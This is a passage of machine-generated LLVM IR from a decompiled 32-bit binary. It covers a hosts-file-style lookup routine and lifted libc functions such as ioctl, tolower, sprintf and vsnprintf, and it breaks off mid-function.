dec_label_pc_804dd59:                             ; preds = %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge, %dec_label_pc_804dc8b
  %v1_804dd5d.pre-phi = phi i32* [ %.pre, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v1_804dc2a, %dec_label_pc_804dc8b ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v4_804dc9b, %dec_label_pc_804dc8b ]
  %stack_var_-20.0.in = phi i32 [ %v1_804dc13, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v0_804dc97, %dec_label_pc_804dc8b ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v1_804dc13, %dec_label_pc_804dc8b ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v0_804dc93, %dec_label_pc_804dc8b ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v0_804dc7e, %dec_label_pc_804dc8b ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge ], [ %v1_804dc57, %dec_label_pc_804dc8b ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_804dd5d.pre-phi, align 4
  %v12_804dde7 = icmp eq i32 %arg4, 2
  %v4_804de12 = inttoptr i32 %arg2 to i8*
  %v12_804de25 = icmp eq i32 %arg3, 2
  %v12_804de47 = icmp eq i32 %arg3, 10
  %v1_804ddf1 = icmp eq i1 %v12_804dde7, false
  %v1_804de2a = icmp eq i1 %v12_804de25, false
  %v1_804de4c = icmp eq i1 %v12_804de47, false
  br label %dec_label_pc_804de6f.outer

dec_label_pc_804de6f.outer:                       ; preds = %dec_label_pc_804de47, %dec_label_pc_804de4e, %dec_label_pc_804de2c, %dec_label_pc_804dd59
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_804dd59 ], [ 2, %dec_label_pc_804de2c ], [ 2, %dec_label_pc_804de4e ], [ 2, %dec_label_pc_804de47 ]
  br label %dec_label_pc_804de6f

dec_label_pc_804dd70:                             ; preds = %dec_label_pc_804de6f
  %v3_804dd78 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_804dd78, i32* @eax, align 4
  %v1_804dd80 = icmp eq i32 %v3_804dd78, 0
  br i1 %v1_804dd80, label %dec_label_pc_804dd87, label %dec_label_pc_804dd84

dec_label_pc_804dd84:                             ; preds = %dec_label_pc_804dd70
  %v1_804dd84 = inttoptr i32 %v3_804dd78 to i8*
  store i8 0, i8* %v1_804dd84, align 1
  br label %dec_label_pc_804dd87

dec_label_pc_804dd87:                             ; preds = %dec_label_pc_804dd70, %dec_label_pc_804dd84
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804ddc734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_804ddc735 = icmp eq i8 %v2_804ddc734, 0
  %v1_804ddca41 = icmp eq i1 %v3_804ddc735, false
  br i1 %v1_804ddca41, label %dec_label_pc_804dd93.preheader.preheader, label %dec_label_pc_804ddcc

dec_label_pc_804dd93.preheader.preheader:         ; preds = %dec_label_pc_804dd87
  %v4_804dd9398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804dd93.preheader

dec_label_pc_804dd8f:                             ; preds = %dec_label_pc_804dd99
  store i8 0, i8* %v1_804dd93104, align 1
  %v0_804dd92 = load i32, i32* @ecx, align 4
  %v1_804dd92 = add i32 %v0_804dd92, 1
  store i32 %v1_804dd92, i32* @ecx, align 4
  %v1_804dd93 = inttoptr i32 %v1_804dd92 to i8*
  %v2_804dd93 = load i8, i8* %v1_804dd93, align 1
  %v3_804dd93 = zext i8 %v2_804dd93 to i32
  %v4_804dd93 = load i32, i32* %eax.global-to-local, align 4
  %v5_804dd93 = and i32 %v4_804dd93, -256
  %v6_804dd93 = or i32 %v5_804dd93, %v3_804dd93
  store i32 %v6_804dd93, i32* @eax, align 4
  %v4_804dd95 = icmp eq i8 %v2_804dd93, 0
  br i1 %v4_804dd95, label %dec_label_pc_804dd93.dec_label_pc_804ddcc.loopexit_crit_edge, label %dec_label_pc_804dd99

dec_label_pc_804dd99:                             ; preds = %dec_label_pc_804dd93.preheader, %dec_label_pc_804dd8f
  %v2_804dd93105 = phi i8 [ %v2_804dd93, %dec_label_pc_804dd8f ], [ %v2_804dd9396, %dec_label_pc_804dd93.preheader ]
  %v1_804dd93104 = phi i8* [ %v1_804dd93, %dec_label_pc_804dd8f ], [ %v1_804dd9395, %dec_label_pc_804dd93.preheader ]
  %v0_804dd8f103 = phi i32 [ %v1_804dd92, %dec_label_pc_804dd8f ], [ %v0_804dd9349, %dec_label_pc_804dd93.preheader ]
  %v2_804dd99 = sext i8 %v2_804dd93105 to i32
  store i32 %v2_804dd99, i32* @edx, align 4
  %v0_804dd9c = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804dd9c, i32* %eax.global-to-local, align 4
  %v2_804dda1 = mul nsw i32 %v2_804dd99, 2
  %v3_804dda1 = add i32 %v0_804dd9c, %v2_804dda1
  %v4_804dda1 = inttoptr i32 %v3_804dda1 to i8*
  %v5_804dda1 = load i8, i8* %v4_804dda1, align 1
  %v6_804dda1 = and i8 %v5_804dda1, 32
  %v7_804dda1 = icmp eq i8 %v6_804dda1, 0
  %v1_804dda5 = icmp eq i1 %v7_804dda1, false
  br i1 %v1_804dda5, label %dec_label_pc_804dd8f, label %dec_label_pc_804dda7

dec_label_pc_804dda7:                             ; preds = %dec_label_pc_804dd99
  %v0_804dda7 = load i32, i32* @edi, align 4
  %v1_804dda7 = add i32 %v0_804dda7, -6
  %v6_804dda7 = sub i32 5, %v0_804dda7
  %v7_804dda7 = and i32 %v6_804dda7, %v0_804dda7
  %v8_804dda7 = icmp slt i32 %v7_804dda7, 0
  %v9_804dda7 = icmp eq i32 %v1_804dda7, 0
  %v10_804dda7 = icmp slt i32 %v1_804dda7, 0
  %v3_804ddaa = icmp eq i1 %v10_804dda7, %v8_804dda7
  %v4_804ddaa = icmp eq i1 %v9_804dda7, false
  %v5_804ddaa = and i1 %v4_804ddaa, %v3_804ddaa
  br i1 %v5_804ddaa, label %dec_label_pc_804ddb3.preheader, label %dec_label_pc_804ddac

dec_label_pc_804ddac:                             ; preds = %dec_label_pc_804dda7
  %v1_804ddac = load i32, i32* @ebx, align 4
  %v3_804ddac = mul i32 %v0_804dda7, 4
  %v4_804ddac = add i32 %v1_804ddac, %v3_804ddac
  %v5_804ddac = inttoptr i32 %v4_804ddac to i32*
  store i32 %v0_804dd8f103, i32* %v5_804ddac, align 4
  %v0_804ddaf = load i32, i32* @edi, align 4
  %v1_804ddaf = add i32 %v0_804ddaf, 1
  store i32 %v1_804ddaf, i32* @edi, align 4
  %v0_804ddb3.pre.pre = load i32, i32* @ecx, align 4
  %v4_804ddb3.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddb3.preheader

dec_label_pc_804ddb3.preheader:                   ; preds = %dec_label_pc_804ddac, %dec_label_pc_804dda7
  %v4_804ddb3.pre = phi i32 [ %v4_804ddb3.pre.pre, %dec_label_pc_804ddac ], [ %v0_804dd9c, %dec_label_pc_804dda7 ]
  %v0_804ddb3.pre = phi i32 [ %v0_804ddb3.pre.pre, %dec_label_pc_804ddac ], [ %v0_804dd8f103, %dec_label_pc_804dda7 ]
  %v0_804ddcc54 = phi i32 [ %v1_804ddaf, %dec_label_pc_804ddac ], [ %v0_804dda7, %dec_label_pc_804dda7 ]
  %v1_804ddb3106 = inttoptr i32 %v0_804ddb3.pre to i8*
  %v2_804ddb3107 = load i8, i8* %v1_804ddb3106, align 1
  %v3_804ddb3108 = zext i8 %v2_804ddb3107 to i32
  %v5_804ddb3109 = and i32 %v4_804ddb3.pre, -256
  %v6_804ddb3110 = or i32 %v3_804ddb3108, %v5_804ddb3109
  store i32 %v6_804ddb3110, i32* @eax, align 4
  %v4_804ddb5111 = icmp eq i8 %v2_804ddb3107, 0
  br i1 %v4_804ddb5111, label %dec_label_pc_804ddc7.loopexit, label %dec_label_pc_804ddb9.lr.ph

dec_label_pc_804ddb9.lr.ph:                       ; preds = %dec_label_pc_804ddb3.preheader
  %v0_804ddbc.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804ddb9

dec_label_pc_804ddb2:                             ; preds = %dec_label_pc_804ddb9
  %v1_804ddb2 = add i32 %v0_804ddc7113, 1
  store i32 %v1_804ddb2, i32* @ecx, align 4
  %v1_804ddb3 = inttoptr i32 %v1_804ddb2 to i8*
  %v2_804ddb3 = load i8, i8* %v1_804ddb3, align 1
  %v3_804ddb3 = zext i8 %v2_804ddb3 to i32
  %v5_804ddb3 = and i32 %v0_804ddbc.pre, -256
  %v6_804ddb3 = or i32 %v3_804ddb3, %v5_804ddb3
  store i32 %v6_804ddb3, i32* @eax, align 4
  %v4_804ddb5 = icmp eq i8 %v2_804ddb3, 0
  br i1 %v4_804ddb5, label %dec_label_pc_804ddc7.loopexit, label %dec_label_pc_804ddb9

dec_label_pc_804ddb9:                             ; preds = %dec_label_pc_804ddb9.lr.ph, %dec_label_pc_804ddb2
  %v2_804ddb3115 = phi i8 [ %v2_804ddb3107, %dec_label_pc_804ddb9.lr.ph ], [ %v2_804ddb3, %dec_label_pc_804ddb2 ]
  %v1_804ddb3114 = phi i8* [ %v1_804ddb3106, %dec_label_pc_804ddb9.lr.ph ], [ %v1_804ddb3, %dec_label_pc_804ddb2 ]
  %v0_804ddc7113 = phi i32 [ %v0_804ddb3.pre, %dec_label_pc_804ddb9.lr.ph ], [ %v1_804ddb2, %dec_label_pc_804ddb2 ]
  %v2_804ddb9 = sext i8 %v2_804ddb3115 to i32
  store i32 %v2_804ddb9, i32* @edx, align 4
  store i32 %v0_804ddbc.pre, i32* @eax, align 4
  %v2_804ddc1 = mul nsw i32 %v2_804ddb9, 2
  %v3_804ddc1 = add i32 %v0_804ddbc.pre, %v2_804ddc1
  %v4_804ddc1 = inttoptr i32 %v3_804ddc1 to i8*
  %v5_804ddc1 = load i8, i8* %v4_804ddc1, align 1
  %v6_804ddc1 = and i8 %v5_804ddc1, 32
  %v7_804ddc1 = icmp eq i8 %v6_804ddc1, 0
  br i1 %v7_804ddc1, label %dec_label_pc_804ddb2, label %dec_label_pc_804ddc7.loopexit

dec_label_pc_804ddc7.loopexit:                    ; preds = %dec_label_pc_804ddb9, %dec_label_pc_804ddb2, %dec_label_pc_804ddb3.preheader
  %v4_804dd9398135 = phi i32 [ %v6_804ddb3110, %dec_label_pc_804ddb3.preheader ], [ %v6_804ddb3, %dec_label_pc_804ddb2 ], [ %v0_804ddbc.pre, %dec_label_pc_804ddb9 ]
  %v0_804ddc7.lcssa = phi i32 [ %v0_804ddb3.pre, %dec_label_pc_804ddb3.preheader ], [ %v1_804ddb2, %dec_label_pc_804ddb2 ], [ %v0_804ddc7113, %dec_label_pc_804ddb9 ]
  %v1_804ddb3.lcssa = phi i8* [ %v1_804ddb3106, %dec_label_pc_804ddb3.preheader ], [ %v1_804ddb3, %dec_label_pc_804ddb2 ], [ %v1_804ddb3114, %dec_label_pc_804ddb9 ]
  %v2_804ddc7 = load i8, i8* %v1_804ddb3.lcssa, align 1
  %v3_804ddc7 = icmp eq i8 %v2_804ddc7, 0
  %v1_804ddca = icmp eq i1 %v3_804ddc7, false
  br i1 %v1_804ddca, label %dec_label_pc_804dd93.preheader, label %dec_label_pc_804ddcc

dec_label_pc_804dd93.preheader:                   ; preds = %dec_label_pc_804dd93.preheader.preheader, %dec_label_pc_804ddc7.loopexit
  %v0_804ddcc.pre138 = phi i32 [ %v0_804ddcc54, %dec_label_pc_804ddc7.loopexit ], [ 0, %dec_label_pc_804dd93.preheader.preheader ]
  %v4_804dd9398 = phi i32 [ %v4_804dd9398135, %dec_label_pc_804ddc7.loopexit ], [ %v4_804dd9398.pre, %dec_label_pc_804dd93.preheader.preheader ]
  %v0_804dd9349 = phi i32 [ %v0_804ddc7.lcssa, %dec_label_pc_804ddc7.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_804dd93.preheader.preheader ]
  %v1_804dd9395 = inttoptr i32 %v0_804dd9349 to i8*
  %v2_804dd9396 = load i8, i8* %v1_804dd9395, align 1
  %v3_804dd9397 = zext i8 %v2_804dd9396 to i32
  %v5_804dd9399 = and i32 %v4_804dd9398, -256
  %v6_804dd93100 = or i32 %v5_804dd9399, %v3_804dd9397
  store i32 %v6_804dd93100, i32* @eax, align 4
  %v4_804dd95101 = icmp eq i8 %v2_804dd9396, 0
  br i1 %v4_804dd95101, label %dec_label_pc_804ddcc, label %dec_label_pc_804dd99

dec_label_pc_804dd93.dec_label_pc_804ddcc.loopexit_crit_edge: ; preds = %dec_label_pc_804dd8f
  %v0_804ddcc.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ddcc

dec_label_pc_804ddcc:                             ; preds = %dec_label_pc_804ddc7.loopexit, %dec_label_pc_804dd93.dec_label_pc_804ddcc.loopexit_crit_edge, %dec_label_pc_804dd93.preheader, %dec_label_pc_804dd87
  %v1_804ddcf = phi i32 [ 0, %dec_label_pc_804dd87 ], [ %v0_804ddcc.pre.pre, %dec_label_pc_804dd93.dec_label_pc_804ddcc.loopexit_crit_edge ], [ %v0_804ddcc.pre138, %dec_label_pc_804dd93.preheader ], [ %v0_804ddcc54, %dec_label_pc_804ddc7.loopexit ]
  %v0_804ddcf = load i32, i32* @ebx, align 4
  %v2_804ddcf = mul i32 %v1_804ddcf, 4
  %v3_804ddcf = add i32 %v0_804ddcf, %v2_804ddcf
  %v4_804ddcf = inttoptr i32 %v3_804ddcf to i32*
  store i32 0, i32* %v4_804ddcf, align 4
  %v7_804ddd6 = icmp sgt i32 %v1_804ddcf, 1
  br i1 %v7_804ddd6, label %dec_label_pc_804dddc, label %dec_label_pc_804de6f

dec_label_pc_804dddc:                             ; preds = %dec_label_pc_804ddcc
  br i1 %v12_804dc0e, label %dec_label_pc_804dea9, label %dec_label_pc_804dde7

dec_label_pc_804dde7:                             ; preds = %dec_label_pc_804dddc
  store i32 1, i32* @esi, align 4
  br i1 %v1_804ddf1, label %dec_label_pc_804de1f.preheader, label %dec_label_pc_804ddf3

dec_label_pc_804de1f.preheader:                   ; preds = %dec_label_pc_804dde7
  %v1_804de1f119 = load i32, i32* @edi, align 4
  %v5_804de21124 = icmp sgt i32 %v1_804de1f119, 1
  br i1 %v5_804de21124, label %dec_label_pc_804de09.lr.ph, label %dec_label_pc_804de6f

dec_label_pc_804de09.lr.ph:                       ; preds = %dec_label_pc_804de1f.preheader
  %v0_804de09.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804de09

dec_label_pc_804ddf3:                             ; preds = %dec_label_pc_804dde7
  %v0_804ddf3 = load i32, i32* @eax, align 4
  %v0_804ddf5 = load i32, i32* @ebx, align 4
  %v1_804ddf5 = inttoptr i32 %v0_804ddf5 to i32*
  %v2_804ddf5 = load i32, i32* %v1_804ddf5, align 4
  %v5_804ddfb = call i32 @__GI_strcoll(i8* %v4_804de12, i32 %v2_804ddf5, i32 %v0_804ddf3, i32 %v0_804ddf3)
  store i32 %v5_804ddfb, i32* %eax.global-to-local, align 4
  %v1_804de03 = icmp eq i32 %v5_804ddfb, 0
  %v1_804de05 = icmp eq i1 %v1_804de03, false
  br i1 %v1_804de05, label %dec_label_pc_804de6f, label %dec_label_pc_804de25

dec_label_pc_804de09:                             ; preds = %dec_label_pc_804de09.lr.ph, %dec_label_pc_804de1e
  %v0_804de09 = phi i32 [ %v0_804de09.pre, %dec_label_pc_804de09.lr.ph ], [ %v5_804de12, %dec_label_pc_804de1e ]
  %v1_804de0b125 = phi i32 [ 1, %dec_label_pc_804de09.lr.ph ], [ %v1_804de1e, %dec_label_pc_804de1e ]
  %v0_804de0b = load i32, i32* @ebx, align 4
  %v2_804de0b = mul i32 %v1_804de0b125, 4
  %v3_804de0b = add i32 %v0_804de0b, %v2_804de0b
  %v4_804de0b = inttoptr i32 %v3_804de0b to i32*
  %v5_804de0b = load i32, i32* %v4_804de0b, align 4
  %v5_804de12 = call i32 @__GI_strcasecmp(i8* %v4_804de12, i32 %v5_804de0b, i32 %v0_804de09, i32 %v0_804de09)
  store i32 %v5_804de12, i32* %eax.global-to-local, align 4
  %v1_804de1a = icmp eq i32 %v5_804de12, 0
  br i1 %v1_804de1a, label %dec_label_pc_804de25, label %dec_label_pc_804de1e

dec_label_pc_804de1e:                             ; preds = %dec_label_pc_804de09
  %v0_804de1e = load i32, i32* @esi, align 4
  %v1_804de1e = add i32 %v0_804de1e, 1
  store i32 %v1_804de1e, i32* @esi, align 4
  %v1_804de1f = load i32, i32* @edi, align 4
  %v5_804de21 = icmp slt i32 %v1_804de1e, %v1_804de1f
  br i1 %v5_804de21, label %dec_label_pc_804de09, label %dec_label_pc_804de6f

dec_label_pc_804de25:                             ; preds = %dec_label_pc_804ddf3, %dec_label_pc_804de09
  br i1 %v1_804de2a, label %dec_label_pc_804de47, label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804de25
  %v0_804de2c = load i32, i32* @esi, align 4
  %v3_804de2d = load i8*, i8** %stack_var_-44, align 4
  %v4_804de2d = ptrtoint i8* %v3_804de2d to i32
  %v0_804de31 = load i32, i32* @ebx, align 4
  %v1_804de31 = inttoptr i32 %v0_804de31 to i32*
  %v2_804de31 = load i32, i32* %v1_804de31, align 4
  %v4_804de35 = inttoptr i32 %v2_804de31 to i8*
  %v5_804de35 = call i32 @inet_pton(i32 2, i8* %v4_804de35, i32 %v4_804de2d, i32 %v0_804de2c)
  store i32 %v5_804de35, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_804de35, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_804dcc5, label %dec_label_pc_804de6f.outer

dec_label_pc_804de47:                             ; preds = %dec_label_pc_804de25
  br i1 %v1_804de4c, label %dec_label_pc_804de6f.outer, label %dec_label_pc_804de4e

dec_label_pc_804de4e:                             ; preds = %dec_label_pc_804de47
  %v0_804de4e = load i32, i32* @ecx, align 4
  %v0_804de53 = load i32, i32* @ebx, align 4
  %v1_804de53 = inttoptr i32 %v0_804de53 to i32*
  %v2_804de53 = load i32, i32* %v1_804de53, align 4
  %v4_804de57 = inttoptr i32 %v2_804de53 to i8*
  %v5_804de57 = call i32 @inet_pton(i32 10, i8* %v4_804de57, i32 %stack_var_-36.0, i32 %v0_804de4e)
  store i32 %v5_804de57, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_804de57, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_804dcf2, label %dec_label_pc_804de6f.outer

dec_label_pc_804de6f:                             ; preds = %dec_label_pc_804de1f.preheader, %dec_label_pc_804de1e, %dec_label_pc_804ddcc, %dec_label_pc_804ddf3, %dec_label_pc_804de6f.outer
  %v0_804de6f = load i32, i32* @edx, align 4
  %v3_804de79 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_804de6f)
  store i32 %v3_804de79, i32* @eax, align 4
  %v1_804de81 = icmp eq i32 %v3_804de79, 0
  %v1_804de83 = icmp eq i1 %v1_804de81, false
  br i1 %v1_804de83, label %dec_label_pc_804dd70, label %dec_label_pc_804de89

dec_label_pc_804de89:                             ; preds = %dec_label_pc_804de6f, %dec_label_pc_804dd1e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_804dd1e ], [ %stack_var_-28.0.ph, %dec_label_pc_804de6f ]
  br i1 %v12_804dc0e, label %dec_label_pc_804dea9, label %dec_label_pc_804de90

dec_label_pc_804de90:                             ; preds = %dec_label_pc_804de89
  %v1_804de97 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_804de97 = call i32 @__GI_fclose(i16* %v1_804de97)
  store i32 %v2_804de97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dea9

dec_label_pc_804dea9:                             ; preds = %dec_label_pc_804dddc, %dec_label_pc_804dbf9, %dec_label_pc_804dc05, %dec_label_pc_804dc23, %dec_label_pc_804dc36, %dec_label_pc_804dc42, %dec_label_pc_804dc4b, %dec_label_pc_804dc75, %dec_label_pc_804de89, %dec_label_pc_804de90, %dec_label_pc_804dcab
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804de89 ], [ %stack_var_-28.1, %dec_label_pc_804de90 ], [ %v2_804dcba, %dec_label_pc_804dcab ], [ 34, %dec_label_pc_804dc75 ], [ 34, %dec_label_pc_804dc4b ], [ 34, %dec_label_pc_804dc42 ], [ 34, %dec_label_pc_804dc36 ], [ 34, %dec_label_pc_804dc23 ], [ 34, %dec_label_pc_804dc05 ], [ 34, %dec_label_pc_804dbf9 ], [ %stack_var_-28.0.ph, %dec_label_pc_804dddc ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_804dbe4, i32* @ebx, align 4
  store i32 %v0_804dbe3, i32* @esi, align 4
  store i32 %v0_804dbe2, i32* @edi, align 4
  store i32 %v0_804dbe1, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_804de1e, { 0, 2, 1 }
  uselistorder i32 %v5_804de12, { 1, 2, 0 }
  uselistorder i32 %v0_804de09, { 1, 0 }
  uselistorder i32 %v1_804ddcf, { 1, 0 }
  uselistorder i8 %v2_804dd9396, { 1, 2, 0 }
  uselistorder i8* %v1_804dd9395, { 1, 0 }
  uselistorder i32 %v0_804dd9349, { 1, 0 }
  uselistorder i32 %v2_804ddb9, { 1, 0 }
  uselistorder i32 %v1_804ddb2, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ddbc.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804dda7, { 1, 0 }
  uselistorder i32 %v0_804dda7, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804dd99, { 1, 0 }
  uselistorder i8* %v4_804de12, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804dc57, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dc36, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804dc13, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804dc1a, { 1, 0 }
  uselistorder i32 %v1_804dbf4, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804dea9, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804de6f, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_804de25, { 1, 0 }
  uselistorder label %dec_label_pc_804de09, { 1, 0 }
  uselistorder label %dec_label_pc_804ddcc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804dd93.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ddb9, { 1, 0 }
  uselistorder label %dec_label_pc_804dd87, { 1, 0 }
  uselistorder label %dec_label_pc_804de6f.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dd59, { 1, 0 }
  uselistorder label %dec_label_pc_804dd1e, { 1, 0 }
  uselistorder label %dec_label_pc_804dc75, { 1, 0 }
  uselistorder label %dec_label_pc_804dc05, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804deb8 = load i32, i32* @edi, align 4
  store i32 %v0_804deb8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804ded0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ded8 = call i32 @ioctl(i32 %v0_804ded0, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804ded0, i32* @ebx, align 4
  store i32 %v3_804ded8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804ded8, -4095
  br i1 %tmp, label %dec_label_pc_804def0, label %dec_label_pc_804dee4

dec_label_pc_804dee4:                             ; preds = %entry
  %v1_804dee4 = call i32 @__errno_location(i32 %v0_804ded0)
  %v0_804dee9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dee9 = sub i32 0, %v0_804dee9
  %v2_804deeb = inttoptr i32 %v1_804dee4 to i32*
  store i32 %v1_804dee9, i32* %v2_804deeb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804def0

dec_label_pc_804def0:                             ; preds = %entry, %dec_label_pc_804dee4
  %v0_804def3 = phi i32 [ %v3_804ded8, %entry ], [ -1, %dec_label_pc_804dee4 ]
  %v2_804def5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804def5, i32* @edi, align 4
  ret i32 %v0_804def3

; uselistorder directives
  uselistorder i32 %v3_804ded8, { 1, 0, 2 }
  uselistorder i32 %v0_804ded0, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_804def0, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804defc = add i32 %arg1, 128
  %v6_804df07 = icmp ugt i32 %v1_804defc, 383
  br i1 %v6_804df07, label %dec_label_pc_804df12, label %dec_label_pc_804df09

dec_label_pc_804df09:                             ; preds = %entry
  %v0_804df09 = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v2_804df0e = mul i32 %arg1, 2
  %v3_804df0e = add i32 %v0_804df09, %v2_804df0e
  %v4_804df0e = inttoptr i32 %v3_804df0e to i16*
  %v5_804df0e = load i16, i16* %v4_804df0e, align 2
  %v6_804df0e = sext i16 %v5_804df0e to i32
  store i32 %v6_804df0e, i32* @edx, align 4
  br label %dec_label_pc_804df12

dec_label_pc_804df12:                             ; preds = %entry, %dec_label_pc_804df09
  %v0_804df12 = phi i32 [ %arg1, %entry ], [ %v6_804df0e, %dec_label_pc_804df09 ]
  ret i32 %v0_804df12

; uselistorder directives
  uselistorder label %dec_label_pc_804df12, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804df1b = ptrtoint i32* %stack_var_12 to i32
  %v4_804df2e = inttoptr i32 %arg1 to i8*
  %v5_804df2e = call i32 @__GI_vsnprintf(i8* %v4_804df2e, i32 -1, i32 %arg2, i32 %v2_804df1b)
  ret i32 %v5_804df2e
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804df38 = load i32, i32* @ebp, align 4
  %v0_804df39 = load i32, i32* @edi, align 4
  %v0_804df3a = load i32, i32* @esi, align 4
  %v0_804df3b = load i32, i32* @ebx, align 4
  store i32 %v0_804df3b, i32* %stack_var_-16, align 4
  %v4_804df3f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804df3f, i32* @esi, align 4
  %v2_804df43 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804df4e = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804df4e, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804df68 = sub i32 -1, %v4_804df3f
  %v1_804df7b = call i32 @__stdio_init_mutex(i32 %v2_804df43)
  %v1_804df8b = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804df68, %v1_804df8b
  %v5_804df8d = select i1 %tmp, i32 %v1_804df68, i32 %v1_804df8b
  store i32 %v5_804df8d, i32* @ebx, align 4
  %v0_804df90 = load i32, i32* @esi, align 4
  %v3_804dfba = inttoptr i32 %arg3 to i8*
  %v4_804dfba = call i32 @_vfprintf_internal(i32 %v2_804df4e, i8* %v3_804dfba, i32 %arg4)
  %v1_804dfc2 = icmp eq i32 %v5_804df8d, 0
  store i32 %v4_804dfba, i32* %edx.global-to-local, align 4
